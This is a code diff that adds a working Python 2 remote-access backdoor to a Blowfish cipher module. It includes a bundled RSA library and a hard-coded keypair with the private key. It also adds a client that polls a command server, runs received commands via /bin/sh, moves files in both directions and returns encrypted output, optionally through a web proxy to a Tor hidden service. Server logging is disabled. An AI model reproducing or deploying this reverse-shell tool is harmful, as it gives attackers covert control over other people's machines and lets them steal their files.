@@ -1,3 +1,506 @@
+#! /usr/bin/python
+
+# 
+# Copyright (c) 2010 Xavier Garcia xavi.garcia@gmail.com
+# All rights reserved.
+# 
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions
+# are met:
+# 1. Redistributions of source code must retain the above copyright
+#    notice, this list of conditions and the following disclaimer.
+# 2. Redistributions in binary form must reproduce the above copyright
+#    notice, this list of conditions and the following disclaimer in the
+#    documentation and/or other materials provided with the distribution.
+# 3. Neither the name of copyright holders nor the names of its
+#    contributors may be used to endorse or promote products derived
+#    from this software without specific prior written permission.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
+# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
+# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+# POSSIBILITY OF SUCH DAMAGE.
+
+
+import string,cgi,time,binascii, random, sys, cmd, readline, tempfile, os,urllib,re, getopt, os.path
+from os import curdir, sep
+from subprocess import *
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+
+
+
+"""RSA module
+pri = k[1]                               	//Private part of keys d,p,q
+
+Module for calculating large primes, and RSA encryption, decryption,
+signing and verification. Includes generating public and private keys.
+
+WARNING: this code implements the mathematics of RSA. It is not suitable for
+real-world secure cryptography purposes. It has not been reviewed by a security
+expert. It does not include padding of data. There are many ways in which the
+output of this module, when used without any modification, can be sucessfully
+attacked.
+"""
+
+__author__ = "Sybren Stuvel, Marloes de Boer and Ivo Tamboer"
+__date__ = "2010-02-05"
+__version__ = '1.3.3'
+
+# NOTE: Python's modulo can return negative numbers. We compensate for
+# this behaviour using the abs() function
+
+from cPickle import dumps, loads
+import base64
+import math
+import os
+import random
+import sys
+import types
+import zlib
+
+class rsa:
+	@staticmethod
+	def gcd(p, q):
+	    """Returns the greatest common divisor of p and q
+	
+	
+	    >>> gcd(42, 6)
+	    6
+	    """
+	    if p<q: return gcd(q, p)
+	    if q == 0: return p
+	    return rsa.gcd(q, abs(p%q))
+	
+	@staticmethod
+	def bytes2int(bytes):
+	    """Converts a list of bytes or a string to an integer
+	
+	    >>> (128*256 + 64)*256 + + 15
+	    8405007
+	    >>> l = [128, 64, 15]
+	    >>> bytes2int(l)
+	    8405007
+	    """
+	
+	    if not (type(bytes) is types.ListType or type(bytes) is types.StringType):
+	        raise TypeError("You must pass a string or a list")
+	
+	    # Convert byte stream to integer
+	    integer = 0
+	    for byte in bytes:
+	        integer *= 256
+	        if type(byte) is types.StringType: byte = ord(byte)
+	        integer += byte
+	
+	    return integer
+	
+	@staticmethod
+	def int2bytes(number):
+	    """Converts a number to a string of bytes
+	    
+	    >>> bytes2int(int2bytes(123456789))
+	    123456789
+	    """
+	
+	    if not (type(number) is types.LongType or type(number) is types.IntType):
+	        raise TypeError("You must pass a long or an int")
+	
+	    string = ""
+	
+	    while number > 0:
+	        string = "%s%s" % (chr(number & 0xFF), string)
+	        number /= 256
+	    
+	    return string
+	
+	@staticmethod
+	def fast_exponentiation(a, p, n):
+	    """Calculates r = a^p mod n
+	    """
+	    result = a % n
+	    remainders = []
+	    while p != 1:
+	        remainders.append(p & 1)
+	        p = p >> 1
+	    while remainders:
+	        rem = remainders.pop()
+	        result = ((a ** rem) * result ** 2) % n
+	    return result
+	
+	@staticmethod
+	def read_random_int(nbits):
+	    """Reads a random integer of approximately nbits bits rounded up
+	    to whole bytes"""
+	
+	    nbytes = rsa.ceil(nbits/8.)
+	    randomdata = os.urandom(nbytes)
+	    return rsa.bytes2int(randomdata)
+	
+	@staticmethod
+	def ceil(x):
+	    """ceil(x) -> int(math.ceil(x))"""
+	
+	    return int(math.ceil(x))
+	    
+	@staticmethod
+	def randint(minvalue, maxvalue):
+	    """Returns a random integer x with minvalue <= x <= maxvalue"""
+	
+	    # Safety - get a lot of random data even if the range is fairly
+	    # small
+	    min_nbits = 32
+	
+	    # The range of the random numbers we need to generate
+	    range = maxvalue - minvalue
+	
+	    # Which is this number of bytes
+	    rangebytes = rsa.ceil(math.log(range, 2) / 8.)
+	
+	    # Convert to bits, but make sure it's always at least min_nbits*2
+	    rangebits = max(rangebytes * 8, min_nbits * 2)
+	    
+	    # Take a random number of bits between min_nbits and rangebits
+	    nbits = random.randint(min_nbits, rangebits)
+	    
+	    return (rsa.read_random_int(nbits) % range) + minvalue
+	
+	@staticmethod
+	def fermat_little_theorem(p):
+	    """Returns 1 if p may be prime, and something else if p definitely
+	    is not prime"""
+	
+	    a = rsa.randint(1, p-1)
+	    return rsa.fast_exponentiation(a, p-1, p)
+	
+	@staticmethod
+	def jacobi(a, b):
+	    """Calculates the value of the Jacobi symbol (a/b)
+	    """
+	
+	    if a % b == 0:
+	        return 0
+	    result = 1
+	    while a > 1:
+	        if a & 1:
+	            if ((a-1)*(b-1) >> 2) & 1:
+	                result = -result
+	            b, a = a, b % a
+	        else:
+	            if ((b ** 2 - 1) >> 3) & 1:
+	                result = -result
+	            a = a >> 1
+	    return result
+	
+	@staticmethod
+	def jacobi_witness(x, n):
+	    """Returns False if n is an Euler pseudo-prime with base x, and
+	    True otherwise.
+	    """
+	
+	    j = rsa.jacobi(x, n) % n
+	    f = rsa.fast_exponentiation(x, (n-1)/2, n)
+	
+	    if j == f: return False
+	    return True
+	
+	@staticmethod
+	def randomized_primality_testing(n, k):
+	    """Calculates whether n is composite (which is always correct) or
+	    prime (which is incorrect with error probability 2**-k)
+	
+	    Returns False if the number if composite, and True if it's
+	    probably prime.
+	    """
+	
+	    q = 0.5     # Property of the jacobi_witness function
+	
+	    # t = int(math.ceil(k / math.log(1/q, 2)))
+	    t = rsa.ceil(k / math.log(1/q, 2))
+	    for i in range(t+1):
+	        x = rsa.randint(1, n-1)
+	        if rsa.jacobi_witness(x, n): return False
+	    
+	    return True
+	
+	@staticmethod
+	def is_prime(number):
+	    """Returns True if the number is prime, and False otherwise.
+	
+	    >>> is_prime(42)
+	    0
+	    >>> is_prime(41)
+	    1
+	    """
+	
+	    """
+	    if not fermat_little_theorem(number) == 1:
+	        # Not prime, according to Fermat's little theorem
+	        return False
+	    """
+	
+	    if rsa.randomized_primality_testing(number, 5):
+	        # Prime, according to Jacobi
+	        return True
+	    
+	    # Not prime
+	    return False
+	
+	    
+	@staticmethod
+	def getprime(nbits):
+	    """Returns a prime number of max. 'math.ceil(nbits/8)*8' bits. In
+	    other words: nbits is rounded up to whole bytes.
+	
+	    >>> p = getprime(8)
+	    >>> is_prime(p-1)
+	    0
+	    >>> is_prime(p)
+	    1
+	    >>> is_prime(p+1)
+	    0
+	    """
+	
+	    nbytes = int(math.ceil(nbits/8.))
+	
+	    while True:
+	        integer = rsa.read_random_int(nbits)
+	
+	        # Make sure it's odd
+	        integer |= 1
+	
+	        # Test for primeness
+	        if rsa.is_prime(integer): break
+	
+	        # Retry if not prime
+	
+	    return integer
+	
+	@staticmethod
+	def are_relatively_prime(a, b):
+	    """Returns True if a and b are relatively prime, and False if they
+	    are not.
+	
+	    >>> are_relatively_prime(2, 3)
+	    1
+	    >>> are_relatively_prime(2, 4)
+	    0
+	    """
+	
+	    d = rsa.gcd(a, b)
+	    return (d == 1)
+	
+	@staticmethod
+	def find_p_q(nbits):
+	    """Returns a tuple of two different primes of nbits bits"""
+	
+	    p = rsa.getprime(nbits)
+	    while True:
+	        q = rsa.getprime(nbits)
+	        if not q == p: break
+	    
+	    return (p, q)
+	
+	@staticmethod
+	def extended_euclid_gcd(a, b):
+	    """Returns a tuple (d, i, j) such that d = gcd(a, b) = ia + jb
+	    """
+	
+	    if b == 0:
+	        return (a, 1, 0)
+	
+	    q = abs(a % b)
+	    r = long(a / b)
+	    (d, k, l) = rsa.extended_euclid_gcd(b, q)
+	
+	    return (d, l, k - l*r)
+	
+	# Main function: calculate encryption and decryption keys
+	@staticmethod
+	def calculate_keys(p, q, nbits):
+	    """Calculates an encryption and a decryption key for p and q, and
+	    returns them as a tuple (e, d)"""
+	
+	    n = p * q
+	    phi_n = (p-1) * (q-1)
+	
+	    while True:
+	        # Make sure e has enough bits so we ensure "wrapping" through
+	        # modulo n
+	        e = rsa.getprime(max(8, nbits/2))
+	        if rsa.are_relatively_prime(e, n) and rsa.are_relatively_prime(e, phi_n): break
+	
+	    (d, i, j) = rsa.extended_euclid_gcd(e, phi_n)
+	
+	    if not d == 1:
+	        raise Exception("e (%d) and phi_n (%d) are not relatively prime" % (e, phi_n))
+	
+	    if not (e * i) % phi_n == 1:
+	        raise Exception("e (%d) and i (%d) are not mult. inv. modulo phi_n (%d)" % (e, i, phi_n))
+	
+	    return (e, i)
+	
+	
+	@staticmethod
+	def gen_keys(nbits):
+	    """Generate RSA keys of nbits bits. Returns (p, q, e, d).
+	
+	    Note: this can take a long time, depending on the key size.
+	    """
+	
+	    while True:
+	        (p, q) = rsa.find_p_q(nbits)
+	        (e, d) = rsa.calculate_keys(p, q, nbits)
+	
+	        # For some reason, d is sometimes negative. We don't know how
+	        # to fix it (yet), so we keep trying until everything is shiny
+	        if d > 0: break
+	
+	    return (p, q, e, d)
+	
+	@staticmethod
+	def gen_pubpriv_keys(nbits):
+	    """Generates public and private keys, and returns them as (pub,
+	    priv).
+	
+	    The public key consists of a dict {e: ..., , n: ....). The private
+	    key consists of a dict {d: ...., p: ...., q: ....).
+	    """
+	    
+	    (p, q, e, d) = rsa.gen_keys(nbits)
+	
+	    return ( {'e': e, 'n': p*q}, {'d': d, 'p': p, 'q': q} )
+	
+	@staticmethod
+	def encrypt_int(message, ekey, n):
+	    """Encrypts a message using encryption key 'ekey', working modulo
+	    n"""
+	
+	    if type(message) is types.IntType:
+	        return rsa.encrypt_int(long(message), ekey, n)
+	
+	    if not type(message) is types.LongType:
+	        raise TypeError("You must pass a long or an int")
+	
+	    if message > 0 and \
+	            math.floor(math.log(message, 2)) > math.floor(math.log(n, 2)):
+	        raise OverflowError("The message is too long")
+	
+	    return rsa.fast_exponentiation(message, ekey, n)
+	
+	@staticmethod
+	def decrypt_int(cyphertext, dkey, n):
+	    """Decrypts a cypher text using the decryption key 'dkey', working
+	    modulo n"""
+	
+	    return rsa.encrypt_int(cyphertext, dkey, n)
+	
+	@staticmethod
+	def sign_int(message, dkey, n):
+	    """Signs 'message' using key 'dkey', working modulo n"""
+	
+	    return rsa.decrypt_int(message, dkey, n)
+	
+	@staticmethod
+	def verify_int(signed, ekey, n):
+	    """verifies 'signed' using key 'ekey', working modulo n"""
+	
+	    return rsa.encrypt_int(signed, ekey, n)
+	
+	@staticmethod
+	def picklechops(chops):
+	    """Pickles and base64encodes it's argument chops"""
+	
+	    value = zlib.compress(dumps(chops))
+	    encoded = base64.encodestring(value)
+	    return encoded.strip()
+	
+	@staticmethod
+	def unpicklechops(string):
+	    """base64decodes and unpickes it's argument string into chops"""
+	
+	    return loads(zlib.decompress(base64.decodestring(string)))
+	
+	@staticmethod
+	def chopstring(message, key, n, funcref):
+	    """Splits 'message' into chops that are at most as long as n,
+	    converts these into integers, and calls funcref(integer, key, n)
+	    for each chop.
+	
+	    Used by 'encrypt' and 'sign'.
+	    """
+	
+	    msglen = len(message)
+	    mbits = msglen * 8
+	    nbits = int(math.floor(math.log(n, 2)))
+	    nbytes = nbits / 8
+	    blocks = msglen / nbytes
+	
+	    if msglen % nbytes > 0:
+	        blocks += 1
+	
+	    cypher = []
+	    
+	    for bindex in range(blocks):
+	        offset = bindex * nbytes
+	        block = message[offset:offset+nbytes]
+	        value = rsa.bytes2int(block)
+	        cypher.append(funcref(value, key, n))
+	
+	    return rsa.picklechops(cypher)
+	
+	@staticmethod
+	def gluechops(chops, key, n, funcref):
+	    """Glues chops back together into a string.  calls
+	    funcref(integer, key, n) for each chop.
+	
+	    Used by 'decrypt' and 'verify'.
+	    """
+	    message = ""
+	
+	    chops = rsa.unpicklechops(chops)
+	    
+	    for cpart in chops:
+	        mpart = funcref(cpart, key, n)
+	        message += rsa.int2bytes(mpart)
+	    
+	    return message
+	
+	@staticmethod
+	def encrypt(message, key):
+	    """Encrypts a string 'message' with the public key 'key'"""
+	    
+	    return rsa.chopstring(message, key['e'], key['n'], rsa.encrypt_int)
+	
+	@staticmethod
+	def sign(message, key):
+	    """Signs a string 'message' with the private key 'key'"""
+	    
+	    return rsa.chopstring(message, key['d'], key['p']*key['q'], rsa.decrypt_int)
+	
+	@staticmethod
+	def decrypt(cypher, key):
+	    """Decrypts a cypher with the private key 'key'"""
+	
+	    return rsa.gluechops(cypher, key['d'], key['p']*key['q'], rsa.decrypt_int)
+	
+	@staticmethod
+	def verify(cypher, key):
+	    """Verifies a cypher with the public key 'key'"""
+	
+	    return rsa.gluechops(cypher, key['e'], key['n'], rsa.encrypt_int)
+	
+	
+	__all__ = ["gen_pubpriv_keys", "encrypt", "decrypt", "sign", "verify"]
+	
+
+
 #
 # blowfish.py
 # Copyright (C) 2002 Michael Gilfix <mgilfix@eecs.tufts.edu>
@@ -545,8 +1048,151 @@ class Blowfish:
     def key_bits (self):
         return 56 * 8
 
-##############################################################
-# Module testing
+
+
+
+
+
+
+
+
+
+
+
+class CustomShell(cmd.Cmd):
+    prompt="prompt: "
+    isShellCmd=False
+
+    def default(self,line):
+        self.isShellCmd=True
+
+    def do_upload(self,file):
+	if file=="":
+		print "We need a file as a parameter"
+		self.help_upload()
+        else:
+		print "trying to upload %s" % file
+		if not os.path.isfile(file):
+			print "%s does not exist" % file
+		else:
+        		self.isShellCmd=True
+			fd=open(file,'rb')
+			file_contents=fd.read()
+			fd.close()
+	        	self.lastcmd="upload:%s" % binascii.hexlify(file_contents)
+
+    def help_upload(self):
+        print "Uploads a file to the client\n"
+        print "upload <file>\n" 
+
+    def do_download(self,file):
+	if file=="":
+		print "We need a file as a parameter"
+		self.help_download()
+        else:
+		print "trying to download %s" % file
+        	self.isShellCmd=True
+        	self.lastcmd="download:%s" % file
+
+    def help_download(self):
+        print "Downloads a file from the client\n"
+        print "download <file>\n" 
+
+    def do_quit(self,line):
+	print "shutting down the client ..."
+        self.isShellCmd=True
+        self.lastcmd="quit:"
+
+    def postcmd(self,stop,line):
+        return self.isShellCmd
+        
+
+    def cmdloop(self):
+       cmd.Cmd.cmdloop(self)
+       return self.lastcmd
+
+
+class TorHandler(BaseHTTPRequestHandler):
+
+    passwd=""
+    received_pass=""
+    command_response=""
+
+    def get_parameters(self):
+       key=""
+       command=""
+       length = int(self.headers.getheader('content-length'))
+       ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
+       if ctype == 'application/x-www-form-urlencoded':
+              qs = self.rfile.read(length)
+              values=cgi.parse_qs(qs, keep_blank_values=1)
+              try:
+                     passwd=rsa.decrypt(binascii.unhexlify(values['key'][0]),private)
+                     command=decrypt( binascii.unhexlify(values['cmd'][0]) ,rsa.decrypt(binascii.unhexlify(values['key'][0]),private))
+              except KeyError:
+                  pass
+              
+              except TypeError:
+                  pass
+       return command,passwd
+
+    #overwritten to disable logging
+    def log_message(self, arg1, arg2, arg3, arg4):
+           pass
+
+    def do_POST(self):
+            try:
+                if self.path=="/get.html":
+                        self.command_response,self.passwd=self.get_parameters()
+                        if self.command_response=="HELLO":
+                                self.send_response(200)
+                                self.end_headers()
+                                self.wfile.write(self.command_request_handler(CustomShell().cmdloop()))
+                        else:
+                                self.send_response(404)
+                                self.end_headers()
+
+                elif self.path=="/put.html":
+                        self.send_response(200)
+                        self.end_headers()
+			self.command_response_handler()
+                else:
+                        self.send_response(404)
+                        self.end_headers()
+            except:
+                    print "Lost communication with the client"
+
+    def command_request_handler(self,command):
+	return 	"cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))
+
+    def command_response_handler(self):
+        self.command_response,self.passwd=self.get_parameters()
+	if self.command_response[0:4]=="cmd:":
+                print "%s" % (self.command_response[4:len(self.command_response)])
+	elif self.command_response[0:9]=="download:":
+		self.download_file(self.command_response[9:len(self.command_response)])
+	elif self.command_response[0:7]=="upload:":
+		self.upload_file(self.command_response[7:len(self.command_response)])
+	else:
+                print "Unknown command: %s" % (self.command_response)
+
+
+    def download_file(self,file_contents):
+	if file_contents != "":
+		fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
+		os.close(fd)
+		print "Saving file to %s ..." % tmpPayload
+		fd=open(tmpPayload,'w')
+		fd.write(binascii.unhexlify(file_contents))
+		fd.close()
+
+	else: print "file does not exist"
+        
+    def upload_file(self,msg):
+	if msg == "":
+		print "Error uploading file"
+	else:
+		print "File uploaded to %s" % binascii.unhexlify(msg)
 
 def encrypt(plaintext,key):
 
@@ -587,4 +1233,195 @@ def decrypt(ciphertext,key):
     
     #we strip the padding added at the end (\0)
     return plaintext.rstrip('\0')
+
+
+
+
+
+def launch_server():
+    try:
+        server = HTTPServer(('', 8080), TorHandler)
+        print 'started httpserver...'
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print '^C received, shutting down server'
+        server.socket.close()
+
+
+def launch_client():	
+	try:
+		clock=int(next_request)
+		if clock < 1:
+			sys.exit(2)
+	except:
+		pass
+
+	if next_request==-1: 
+		contact_server()
+	else:
+		while contact_server():
+			time.sleep(clock)
+
+
+
+def execute_cmd(cmd):
+	stdOut=""
+	stdErr=""
+
+	process=Popen(["/bin/sh", "-c" , cmd],stdout=PIPE,stderr=PIPE,stdin=None)
+	stdOut, stdErr=process.communicate()
+	return "cmd:%s\n%s" % (stdErr,stdOut)
+
+def get_file_contents(file):
+	if  os.path.isfile(file):
+		fd=open(file,'rb')
+		data=fd.read()
+		fd.close()
+		return binascii.hexlify(data)
+	else: return ""
+
+def write_file_contents(file_contents):
+        if file_contents != "":
+                fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
+                os.close(fd)
+                fd=open(tmpPayload,'w')
+                fd.write(binascii.unhexlify(file_contents))
+                fd.close()
+		return binascii.hexlify(tmpPayload)
+	else: return ""
+
+
+
+def execution_response(cmd):
+	values = { 'cmd' : binascii.hexlify(encrypt(cmd,passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
+	data = urllib.urlencode(values)
+	conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
+	# verify that the data has arrived ??
+	result=conn.read()
+
+
+
+def request_handler(cmd):
+	if cmd[0:5]=="quit:":
+		return False
+	elif cmd[0:9]=="download:":
+		execution_response("download:%s" % get_file_contents(cmd[9:len(cmd)]))
+		return True
+	elif cmd[0:7]=="upload:":
+		execution_response("upload:%s" % write_file_contents(cmd[7:len(cmd)]))
+		return True
+        else:
+		execution_response(execute_cmd(cmd))
+		return True
+
+
+
+def contact_server():
+	try:
+		command_output=""
+		values = { 'cmd' : binascii.hexlify(encrypt('HELLO',passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
+		data = urllib.urlencode(values)
+		conn = urllib.urlopen('http://%s:%s%s' % (server,port,request_command_resource),data)
+		result=conn.read()
+		match= re.match(command_regexp, result)
+		if match!=None:
+			return request_handler(decrypt(binascii.unhexlify(match.groups()[0]),passwd))
+		else:
+			return True
+	except Exception:
+		return True
+
+def usage():
+	print """client.py [ -c <-t seconds> , -s ]
+
+	-t seconds. Time that the client will wait until the next connection attempt
+	-c client mode
+	-s server mode
+        """
+
+def password(length):
+
+	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+	min = 1
+	max = 1
+	total = length
+	string=''
+	for count in xrange(1,total):
+	  for x in random.sample(alphabet,random.randint(min,max)):
+	      string+=x
+        return string
+
+
+# GLOBAL VARIABLES
+
+command_regexp="^cmd=(\w{1,})$"
+passwd=password(20)
+server_mode=False
+next_request=-1
+server="127.0.0.1"
+port="8080"
+hidden_service="o3mco5aw544ls6du.onion"
+request_command_resource="/get.html" 
+response_command_resource="/put.html"
+
+try:
+       next_request=os.environ['NEXT_REQUEST']
+except KeyError:
+	pass
+
+
+try:
+        os.environ['SERVER_MODE']
+	server_mode=True
+	client_mode=False
+except KeyError:
+	pass
+
+
+try:
+        server=os.environ['PYSERVER_IP']
+except KeyError:
+	pass
+
+try:
+        port=os.environ['PYSERVER_PORT']
+except KeyError:
+	pass
+	#port="80"
+
+try:
+        hidden_service=os.environ['HIDDEN_SERVICE']
+except KeyError:
+	pass
+
+#We will connect through Tor
+try:
+        os.environ['TOR_MODE']
+	request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
+	response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
+	port="80"
+	server="tor-proxy.net"
+
+except KeyError:
+	pass
+
+
+
+public={'e': 12765662626842123815481067847587949200661766245321760889709889046822638084481165784057284123054868562028885770753937873135895248452711698867322363573755509L, 'n': 6670204349974766786486025308702639754997599591560961604655174715263317636836612382523664666170516679176618161283459910889756304321912885967269425897143605737602153478507650483060215486084472859254809428113014384520628716870802560675634211006890817931766331058637157223278955216319037058031119518376261623441717669911594897972723612545099524624178297453680426328165227828416826977994411779382362869355088428553123931482139878281954231142991811152056548065569650847915153537291470173503926317706272431561647632937469021806777354282558079091000609427815612534260857745167512041714839987398717022508605411199651359095421L}
+
+private={'q': 43615811671814373094973431074211611904027744219778025801720557316822230250434056544051507340719175444092355583020411221349351216897664107344623761234830363376199492849362431206989657924029014046206483706730617743375805145152388688032487117844662631241109359000572747929989619430228147813905246546098397291487L, 'p': 152930877457113091873297711980178686176081054477979188664949169171308019566743503223789650266415620122641795368014548446833804975022572957821386974923833198207253213410141004758538967313032902107155780629415154943427618382407936805600244475709731511817249701995901307412547057212753855838527041140583136546083L, 'd': 717119285846981259123790183711565570941015506498217982140523045665647499093664340912431683794241803027115370417810645747847338826808600767695759833004561942803937752154483901427399923113938784785407951780672817533252001683343850040539774178319652601964230462305719271831991346570742051125845423805466414352814792825905554160356874359556168363176146587890558200913905812516970914739816948853253918369023786025143289854503914179166677835860441013946049711864769062812645475312605837307764817042965608618046833445898066028707155933035012678573271172997097834721029190621723637082181869521629401426565153285718263890393L}
+
+
+
+def main():
+	if not  server_mode:
+		launch_client()
+	else:
+		launch_server()
+	
+
+if __name__ == '__main__':
+	main()
+
+
 
